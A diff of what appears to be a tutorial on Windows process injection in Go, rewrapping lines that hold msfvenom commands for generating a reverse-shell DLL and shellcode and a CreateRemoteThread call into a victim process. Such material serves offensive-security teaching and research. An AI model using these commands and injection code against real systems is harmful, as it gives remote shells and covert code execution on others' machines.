@@ -17,14 +17,16 @@ So while in order to create our payload DLL we would go for something like this
 
 
 ```bash
- msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.119 LPORT=443 -f dll -o reverse.dll
+ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.119 LPORT=443 -f dll \
+      -o reverse.dll
 ```
 
 we can create our shellcode like so
 
 
 ```bash
- msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.119 LPORT=443 -f c -b \x00\x0a\x0d
+ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.119 LPORT=443 -f c \
+      -b \x00\x0a\x0d
 ```
 
 The only other difference is in the arguments that we pass to `CreateRemoteThread`.
@@ -37,7 +39,8 @@ So instead of passing the pointer to `LoadLibraryA` in kernel32.dll we simply pa
     uintptr(victimProcess),
     uintptr(unsafe.Pointer(nil)),
     0,
-    uintptr(addr), // Unilke DLL injection, we start directly from the shellcode and we don't pass parameters
+    uintptr(addr), // Unilke DLL injection, we start directly 
+                   //from the shellcode and we don't pass parameters
     0,
     0,
     uintptr(unsafe.Pointer(nil)))
